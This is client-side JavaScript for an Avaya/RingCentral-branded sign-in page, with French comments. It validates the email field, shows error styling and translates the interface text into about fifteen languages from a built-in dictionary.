

document.addEventListener('DOMContentLoaded', function () {
    document.getElementById('form-login').addEventListener('submit', function (event) {
      event.preventDefault(); // Empêche la soumission du formulaire
  
      // Sélectionner le champ email par son nom ou son ID
      let email = document.getElementById('email').value;
      let emailValid = isValidEmail(email);
      let errorMessage = document.querySelector('.error-message');
      let text = document.querySelector('.text')
      let input = this.querySelector('.input-group')
  
      if (!emailValid) {
        errorMessage.style.display = 'flex'; // Affiche le message d'erreur pour l'email
        text.style.color = "rgb(227, 30, 30)";
        input.style.boxShadow = "0 0 8px rgb(227, 30, 30)";
      } else {
        errorMessage.style.display = 'none'; // Cache le message d'erreur pour l'email
      }
      if (emailValid) {
        // Soumettre le formulaire ou effectuer une autre action ici
        
        document.getElementById('form-login').submit();
      } else {
        
      }
    });
  });
  
  // Fonction de validation de l'email
  function isValidEmail(email) {
    // Regex simple pour valider les emails
    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailPattern.test(email);
  }



document.addEventListener('DOMContentLoaded', () => {
    const languageSelect = document.getElementById('language-select');
    const translatableElements = document.querySelectorAll('.translatable,.text,h1,.form-button,.error-message,.login-text,.auth,.footer-element,.legal1,.legal2,.footer-text');

    // Dictionnaire des traductions
    const translations = {
        de: {
            adress: "E-Mail-Adresse oder Telefonnummer",
            connexion: "Anmelden",
            next: "Weiter",
            error: "Geben Sie eine E-Mail-Adresse oder Telefonnummer ein.",
            login: "Oder anmelden mit",
            auth: "Einmalige Anmeldung (SSO)",
            element: "Schützen Sie Ihr Konto vor Identitätsdiebstahl und Phishing",
            legal1: "Rechtliches",
            legal2: "Datenschutz",
            footertext: "Avaya und das Avaya-Logo sind Marken von Avaya Intellectual Property.<br>Alle weiteren Logos, Marken, Designs usw. sind die Marken und das geistige Eigentum von RingCentral, Inc."
        },
        'en-au': {
            adress: "Email address or phone number",
            connexion: "Sign in",
            next: "Next",
            error: "Enter an email address or phone number.",
            login: "Or sign in with",
            auth: "Single sign-on",
            element: "Protect your account from identity theft and phishing",
            legal1: "Legal",
            legal2: "Privacy",
            footertext: "Avaya and the Avaya logo are trademarks of Avaya Intellectual Property.<br>All other logos, marks, designs and otherwise are the trademarks and intellectual property of RingCentral, Inc."
        },
        'en-uk': {
            adress: "Email address or phone number",
            connexion: "Sign in",
            next: "Next",
            error: "Enter an email address or phone number.",
            login: "Or sign in with",
            auth: "Single sign-on",
            element: "Protect your account from identity theft and phishing",
            legal1: "Legal",
            legal2: "Privacy",
            footertext: "Avaya and the Avaya logo are trademarks of Avaya Intellectual Property.<br>All other logos, marks, designs and otherwise are the trademarks and intellectual property of RingCentral, Inc."
        },
        'es': {
            adress: "Correo electrónico o número de teléfono",
            connexion: "Iniciar sesión",
            next: "Siguiente",
            error: "Enter an email address or phone number.",
            login: "O iniciar sesión con",
            auth: "Inicio de sesión único",
            element: "Proteja su cuenta de robos y suplantaciones de identidad",
            legal1: "Legal",
            legal2: "Privacidad",
            footertext: "Avaya y el logotipo de Avaya son marcas registradas de Avaya Intellectual Property.<br>El resto de logotipos, marcas, diseños y demás son marcas comerciales y propiedad intelectual de RingCentral, Inc."
        },
        'es-lat': {
            adress: "Correo electrónico o número de teléfono",
            connexion: "Iniciar sesión",
            next: "Siguiente",
            error: "Enter an email address or phone number.",
            login: "O iniciar sesión con",
            auth: "Inicio de sesión único",
            element: "Proteja su cuenta de robos y suplantaciones de identidad",
            legal1: "Legal",
            legal2: "Privacidad",
            footertext: "Avaya y el logotipo de Avaya son marcas registradas de Avaya Intellectual Property.<br>El resto de logotipos, marcas, diseños y demás son marcas comerciales y propiedad intelectual de RingCentral, Inc."
        },
        'fr': {
            adress: "Adresse e-mail ou numéro de téléphone",
            connexion: "Connexion",
            next: "Suivant",
            error: "Saisissez une adresse e-mail ou un numéro de téléphone.",
            login: "Ou connectez-vous avec",
            auth: "Authentification unique",
            element: "Protégez votre compte contre le vol d’identité et l’hameçonnage.",
            legal1: "Mentions légales",
            legal2: "Confidentialité",
            footertext: "Avaya et le logo Avaya sont des marques commerciales d'Avaya Intellectual Property.<br> L'ensemble des autres logos, marques, designs et autres éléments sont des marques déposées et la propriété intellectuelle de RingCentral, Inc."
        },
        'fr-ca': {
            adress: "Courriel ou numéro de téléphone",
            connexion: "Se connecter",
            next: "Suivant",
            error: "Saisissez une adresse e-mail ou un numéro de téléphone.",
            login: "Ou connectez-vous avec",
            auth: "Authentification unique",
            element: "Protégez votre compte contre le vol d’identité et l’hameçonnage.",
            legal1: "Mentions légales",
            legal2: "Confidentialité",
            footertext: "Avaya et le logo Avaya sont des marques commerciales d'Avaya Intellectual Property.<br> L'ensemble des autres logos, marques, designs et autres éléments sont des marques déposées et la propriété intellectuelle de RingCentral, Inc."
        },
        'ita': {
            adress: "Indirizzo e-mail o numero di telefono",
            connexion: "Accedi",
            next: "Avanti",
            error: "Inserisci un indirizzo e-mail o un numero di telefono.",
            login: "Oppure accedi con",
            auth: "Single Sign-on",
            element: "Proteggi il tuo account dai furti d'identità e dal phishing",
            legal1: "Informazioni legali",
            legal2: "Privacy",
            footertext: "Avaya e il logo Avaya sono marchi di Avaya Intellectual Property.<br>Tutti gli altri loghi, marchi, design e simili sono marchi commerciali e proprietà intellettuale di RingCentral, Inc."
        },
        'ned': {
            adress: "E-mailadres of telefoonnummer",
            connexion: "Aanmelden",
            next: "Volgende",
            error: "Geef een e-mailadres of telefoonnummer op.",
            login: "Of meld u aan met",
            auth: "Single Sign-on",
            element: "Uw account beschermen tegen identiteitsdiefstal en phishing",
            legal1: "Juridisch",
            legal2: "Privacy",
            footertext: "Avaya en het Avaya-logo zijn handelsmerken van Avaya Intellectual Property.<br>Alle andere logo's, markeringen, ontwerpen en dergelijke zijn de handelsmerken en het intellectuele eigendom van RingCentral, Inc."
        },
        'pt': {
            adress: "Email ou número de telefone",
            connexion: "Entrar",
            next: "Avançar",
            error: "Insira um email ou número de telefone.",
            login: "Ou entre com",
            auth: "Login único",
            element: "Proteja sua conta contra roubo de identidade e phishing",
            legal1: "Jurídico",
            legal2: "Privacidade",
            footertext: "A Avaya e o logotipo da Avaya são marcas registradas da Avaya Intellectual Property.<br>Todas as outras marcas, logotipos e designs, entre outros, são marcas registradas e propriedade intelectual da RingCentral, Inc."
        },
        'pt-pt': {
            adress: "Email ou número de telefone",
            connexion: "Iniciar sessão",
            next: "Seguinte",
            error: "Introduza um e-mail ou número de telefone.",
            login: "Ou inicie a sessão com",
            auth: "Início de sessão único",
            element: "Proteja sua conta contra roubo de identidade e phishing",
            legal1: "Jurídico",
            legal2: "Privacidade",
            footertext: "Avaya e o logótipo Avaya são marcas comerciais da Avaya Intellectual Property.<br>Todos os outros logótipos, marcas, designs e outros são marcas comerciais e propriedade intelectual da RingCentral, Inc."
        },
        'suo': {
            adress: "Sähköposti tai puhelinnumero",
            connexion: "Kirjaudu sisään",
            next: "Seuraava",
            error: "Anna sähköpostiosoite tai puhelinnumero",
            login: "Tai kirjaudu sisään",
            auth: "Kertakirjautuminen",
            element: "Suojaa tiliäsi henkilöllisyysvarkauksilta ja tietojenkalastelulta",
            legal1: "Juridiset tiedot",
            legal2: "Tietosuoja",
            footertext: "Avaya ja Avaya-logo ovat Avaya Intellectual Propertyn tavaramerkkejä.<br>Kaikki muut logot, merkit, designit ja muut vastaavat ovat RingCentral, Inc:n tavaramerkkejä ja immateriaaliomaisuutta."
        },
        'kor': {
            adress: " 전자 메일 또는 전화번호",
            connexion: "로그인",
            next: "다음",
            error: "전자 메일 또는 전화번호를 입력하세요.",
            login: "또는 다음 방법으로 로그인",
            auth: "Single sign-on",
            element: "신원 도용 및 피싱으로부터 계정 보호",
            legal1: "법적 고지 사항 ",
            legal2: "개인 정보 보호",
            footertext: "Avaya 및 Avaya 로고는 Avaya Intellectual Property의 상표입니다.<br>기타 모든 로고, 마크, 디자인 등은 RingCentral, Inc.의 상표 및 지적 재산입니다."
        },
        'jap': {
            adress: "メールまたは電話番号",
            connexion: "サインイン",
            next: "次へ",
            error: "Eメールアドレスまたは電話番号を入力してください。",
            login: "他のアカウントでサインイン",
            auth: "シングルサインオン",
            element: "なりすましやフィッシングからアカウントを保護",
            legal1: "リーガル",
            legal2: "プライバシー",
            footertext: "AvayaおよびAvayaのロゴは、Avaya Intellectual Propertyの商標です。<br>その他すべてのロゴ、標章、デザインなどは、RingCentral, Inc.の商標および知的財産です。"
        },
        'chi': {
            adress: "电子邮件或电话号码",
            connexion: "登录",
            next: "下一步",
            error: "输入电子邮件或电话号码。",
            login: "其他登录方式",
            auth: "单点登录",
            element: "防止您的帐户遭到身份盗窃和网络钓鱼",
            legal1: "法律信息",
            legal2: " 隐私",
            footertext: "Avaya 和 Avaya 徽标是 Avaya Intellectual Property 的商标。<br>所有其他徽标、标志、设计图案等均是 RingCentral, Inc. 的商标和知识产权。"
        }
        // Add other languages here...
    };

    // Fonction pour traduire le contenu de la page
    function translatePage(lang) {
        const translationsForLang = translations[lang] || translations['en-au'];
        translatableElements.forEach(element => {
            const key = element.getAttribute('data-key');
            if (translationsForLang[key]) {
                element.innerHTML = translationsForLang[key];
            }
        });
    }

    // Ajouter un gestionnaire d'événements pour le changement de sélection de la langue
    languageSelect.addEventListener('change', (event) => {
        const selectedLang = event.target.value; // Obtenir la langue sélectionnée
        translatePage(selectedLang); // Traduire la page en fonction de la langue
    });
});




